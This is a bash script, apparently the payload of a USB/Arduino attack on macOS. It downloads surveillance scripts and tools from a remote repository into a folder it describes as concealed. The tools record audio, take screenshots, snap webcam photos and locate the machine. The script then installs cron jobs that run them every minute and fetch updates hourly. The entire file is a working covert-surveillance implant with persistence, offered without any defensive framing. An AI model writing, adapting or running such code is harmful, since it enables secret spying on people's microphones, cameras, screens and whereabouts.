#!/bin/bash

# Download the main files from the repository and saves them to the /Library/Caches folder (write accessible, concealed folder)
wget -O /Library/Caches/cron-01.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-01.sh
wget -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-60.sh

wget -O /Library/Caches/soundalarm.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/soundalarm.scpt
wget -O /Library/Caches/clickpoint.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/clickpoint.scpt

wget -O /Library/Caches/getuuid.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/getuuid.sch
wget -O /Library/Caches/recordaudio.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/recordaudio.sh
wget -O /Library/Caches/screenshot.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/screenshot.sh
wget -O /Library/Caches/photo.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/photo.sh
wget -O /Library/Caches/locateme.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/locateme.sh

wget -O /Library/Caches/LocateMe https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/LocateMe
wget -O /Library/Caches/imagesnap https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/imagesnap

# Add cron task to run every minute
( crontab -l ; echo "* * * * * /bin/sh /Library/Caches/cron-01.sh" ) | crontab -

# Add cron task to check for updates every hour
( crontab -l ; echo "0 * * * * /bin/sh /Library/Caches/cron-60.sh" ) | crontab -

